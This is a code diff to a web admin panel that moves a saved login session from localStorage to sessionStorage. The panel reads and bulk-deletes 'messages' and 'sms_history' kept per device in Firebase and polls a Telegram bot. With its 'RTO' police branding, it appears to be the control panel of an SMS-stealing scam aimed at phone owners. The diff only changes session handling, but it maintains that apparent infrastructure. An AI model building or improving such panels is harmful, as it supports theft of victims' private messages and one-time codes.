@@ -966,7 +966,7 @@ function openAccount(idx) {
   openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account');
 }
 
-// ✅ FIX 1: openPanel — session save karo
+// ✅ FIX 1: openPanel — session save karo (sessionStorage)
 function openPanel(config, title) {
   try {
     if (currentApp) { try { currentApp.delete(); } catch(e) {} }
@@ -977,8 +977,8 @@ function openPanel(config, title) {
     currentAccount.name = title;
     currentAccount.apiKey = config.apiKey;
     currentAccount.isRTO = currentAccount.isRTO || false;
-    // ✅ Session save
-    try { localStorage.setItem('rto_session', JSON.stringify(currentAccount)); } catch(e) {}
+    // ✅ Session save — sessionStorage (tab-specific, refresh pe rehta hai, naya tab pe clear)
+    try { sessionStorage.setItem('rto_session', JSON.stringify(currentAccount)); } catch(e) {}
     document.getElementById('topTitle').textContent = '🚔 ' + title;
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
@@ -987,10 +987,10 @@ function openPanel(config, title) {
   } catch(e) { alert('Connection failed: ' + e.message); }
 }
 
-// ✅ FIX 1: doLogout — session clear karo
+// ✅ FIX 1: doLogout — session clear karo (sessionStorage)
 function doLogout() {
   // ✅ Session clear
-  try { localStorage.removeItem('rto_session'); } catch(e) {}
+  try { sessionStorage.removeItem('rto_session'); } catch(e) {}
   stopTelegramPolling();
   if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} telegramConfigListener = null; }
   TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
@@ -1697,16 +1697,15 @@ document.getElementById('btnFb').addEventListener('click', function() { alert('F
 document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
 renderAccounts();
 
-// ✅ FIX 1: Auto-restore session on page load
+// ✅ FIX 1: Auto-restore session on page load (sessionStorage — tab-specific)
 (function() {
   try {
-    var saved = localStorage.getItem('rto_session');
+    var saved = sessionStorage.getItem('rto_session');
     if (!saved) return;
     var acc = JSON.parse(saved);
     if (!acc || !acc.url) return;
     console.log('🔄 Restoring session:', acc.name);
     currentAccount = acc;
-    // Login screen turant hide karo
     document.getElementById('loginScreen').style.display = 'none';
     openPanel({
       apiKey: acc.apiKey || RTO_CONFIG.apiKey,
@@ -1715,7 +1714,7 @@ renderAccounts();
     }, acc.name || 'RTO Admin');
   } catch(e) {
     console.log('Session restore error:', e.message);
-    try { localStorage.removeItem('rto_session'); } catch(_) {}
+    try { sessionStorage.removeItem('rto_session'); } catch(_) {}
   }
 })();
 </script>
